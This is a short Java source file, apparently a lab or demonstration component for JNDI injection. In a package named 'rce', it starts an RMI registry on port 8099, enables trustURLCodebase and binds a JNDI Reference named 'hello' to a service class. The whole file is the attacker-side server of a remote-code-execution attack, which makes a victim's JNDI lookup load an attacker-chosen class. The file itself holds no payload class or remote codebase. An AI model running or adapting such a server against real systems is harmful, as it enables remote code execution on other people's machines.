package com.rce.server;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RmiServer {

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Registry registry = LocateRegistry.createRegistry(8099);
        System.out.println("RMI启动，监听：8099 端口");
        Reference reference = new Reference("com.rce.server.service.HelloServiceImpl", "com.rce.server.service.HelloServiceImpl", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);
        Thread.currentThread().join();
    }
}
